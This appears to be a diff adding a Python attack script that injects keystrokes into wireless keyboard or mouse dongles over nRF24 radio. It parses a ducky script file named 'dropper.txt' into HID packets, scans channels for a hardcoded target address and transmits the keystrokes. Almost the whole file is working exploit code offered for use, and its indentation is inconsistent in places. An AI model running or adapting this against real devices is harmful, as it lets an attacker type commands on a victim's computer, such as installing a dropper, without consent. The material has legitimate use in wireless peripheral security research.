@@ -1,0 +1,154 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import time
+from copy import deepcopy
+
+# Imports to firmware allowing us to interface with radio PA device code provide by:
+# https://github.com/BastilleResearch/nrf-research-firmware
+from src import nrf24
+from src import nrf24_reset
+# Coverts script into ducky script readable by device
+# Modified code found at:
+# https://github.com/insecurityofthings/jackit/blob/master/jackit/duckyparser.py
+from src import duckyparser
+
+'''
+FUNCTIONS
+'''
+
+def banner():
+    print(r"""
+                                                                             
+                        .--,-``-.                              .--,-``-.     
+    ,---,              /   /     '.    ,----..     ,----..    /   /     '.   
+  .'  .' `\           / ../        ;  /   /   \   /   /   \  / ../        ;  
+,---.'     \   __  ,-.\ ``\  .`-    '|   :     : |   :     : \ ``\  .`-    ' 
+|   |  .`\  |,' ,'/ /| \___\/   \   :.   |  ;. / .   |  ;. /  \___\/   \   : 
+:   : |  '  |'  | |' |      \   :   |.   ; /--`  .   ; /--`        \   :   | 
+|   ' '  ;  :|  |   ,'      /  /   / ;   | ;  __ ;   | ;  __       /  /   /  
+'   | ;  .  |'  :  /        \  \   \ |   : |.' .'|   : |.' .'      \  \   \  
+|   | :  |  '|  | '     ___ /   :   |.   | '_.' :.   | '_.' :  ___ /   :   | 
+'   : | /  ; ;  : |    /   /\   /   :'   ; : \  |'   ; : \  | /   /\   /   : 
+|   | '` ,/  |  , ;___/ ,,/  ',-    .'   | '/  .''   | '/  .'/ ,,/  ',-    . 
+;   :  .'     ---'/  .\ ''\        ; |   :    /  |   :    /  \ ''\        ;  
+|   ,.'           \  ; \   \     .'   \   \ .'    \   \ .'    \   \     .'   
+'---'              `--" `--`-,,-'      `---`       `---`       `--`-,,-'     
+                                                                             """)
+
+def format_address(data):
+    #print("Coverting Input From Display: %s" % (data))
+    return [int(b, 16) for b in data.split(':')]
+
+#Adds Check sum to the  packet
+def checkSum(packet):
+    cksum = 255
+    for x in range(0, len(packet) - 1):
+        cksum = (cksum - packet[x])
+    cksum += 1
+    return cksum
+
+def buildPackets(attack):
+    # Init packet to start communications
+    packetList[0] = helloPacket
+    packetIndex = len(packetList) - 1
+    packetList[packetIndex][1] = 12
+    # Looping through the intructions given by script
+    for i in range(0, len(attack)):
+        instruction = attack[i]
+
+	if i < len(attack)-1:
+	   lookAheadInstruction = attack[i+1]
+	else:
+	   lookAheadInstruction = None
+
+	if instruction['hid'] > 0 or instruction['mod'] > 0:
+	   #More Packets Coming
+	   packetList.append(communicationPacket[:])
+
+           packetIndex = len(packetList) - 1
+	   packetList[packetIndex] = deepcopy(communicationPacket[:])
+	   packetList[packetIndex][0][2] = instruction['mod']
+	   packetList[packetIndex][0][3] = instruction['hid']
+
+	   packetList[packetIndex][0][9] = checkSum(packetList[packetIndex][0])
+	   packetList[packetIndex][1] = 12
+
+	   packetList.append(keepAlivePacket)
+	   packetIndex = len(packetList) - 1
+	   packetList[packetIndex][1] = 0
+
+	   if not lookAheadInstruction or instruction['hid'] == lookAheadInstruction['hid'] or lookAheadInstruction['sleep']:
+	      packetList.append(communicationPacket[:])
+	      packetIndex = len(packetList) - 1
+	      packetList[packetIndex][0][9] = checkSum(packetList[packetIndex][0])
+	      packetList[packetIndex][1] = 0
+	elif instruction['sleep']:
+	     #converts seconds to milliseconds
+	     sleepPackets = instruction['sleep']
+	     sleepPackets = int(sleepPackets)/10
+	     for x in range(0, sleepPackets):
+		 packetList.append(keepAlivePacket[:])
+		 packetIndex = len(packetList) - 1
+		 packetList[packetIndex][1] = 10
+
+def transmit_payload(payload):
+    return radio.transmit_payload(payload)
+
+'''
+Variables
+'''
+
+# Used to send the keystrokes of the ducky script
+#communicationPacket = [[]]
+communicationPacket = [[0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], 0x00]
+# First packet in transmition
+helloPacket = [[0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED], 0x00]
+# Keeps device listening for more packets
+keepAlivePacket = [[0x00, 0x40, 0x04, 0xB0, 0x0C], 0x00]
+# List of packet to send to target (Converted from attack script)
+packetList = [[]]
+
+readableAddress = "F6:7E:9D:67:0A"
+script = "dropper.txt"
+scannableChannels = range(2, 84)
+channel = 2
+pingPacket = [0x0f, 0x0f, 0x0f, 0x0f]
+address = format_address(readableAddress)[::-1]
+
+# attack script
+file = open(script, 'r')
+
+parser = duckyparser.DuckyParser(file.read())
+attack = parser.parse()
+
+'''
+Driver Code
+'''
+
+banner()
+
+# Resets hardware USB Bus then creates radio object
+nrf24_reset.reset_radio(0)
+radio = nrf24.nrf24(0)
+# enables low-noise amplifier
+radio.enable_lna()
+# Puts radio into monitor mode
+radio.enter_sniffer_mode(address)
+
+# Scans for the channel the device is on
+for x in scannableChannels:
+    radio.set_channel(x)
+    if radio.transmit_payload(pingPacket):
+        channel = x
+	break
+
+#sendAttack(radio, hid, attack)
+
+buildPackets(attack)
+for x in packetList:
+    transmit_payload(x[0])
+    time.sleep(x[1] / 1000.0)
+
